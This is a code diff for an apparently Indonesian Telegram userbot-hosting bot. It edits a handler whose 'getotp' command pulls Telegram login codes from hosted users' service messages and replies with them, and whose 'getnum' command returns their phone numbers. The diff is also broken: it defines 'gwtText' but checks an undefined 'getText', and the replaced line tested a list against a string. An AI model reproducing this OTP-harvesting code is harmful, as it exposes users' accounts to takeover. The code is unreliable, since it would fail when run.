@@ -111,11 +111,12 @@ async def get_my_otp(client, message):
             f"<b>{message.text} ᴜsᴇʀ_ɪᴅ ᴜsᴇʀʙᴏᴛ ʏᴀɴɢ ᴀᴋᴛɪғ</b>", quote=True
         )
     try:
+        gwtText = ["Kode masuk Anda:", "Your login code:"]
         for X in ubot._ubot:
             if int(message.command[1]) == X.me.id:
                 if message.command[0] == "getotp":
                     async for otp in X.search_messages(777000):
-                        if ["Kode masuk Anda:", "Your login code:"] in otp.text:
+                        if getText in otp.text:
                             return await message.reply(otp.text, quote=True)
                 elif message.command[0] == "getnum":
                     return await message.reply(X.me.phone_number, quote=True)
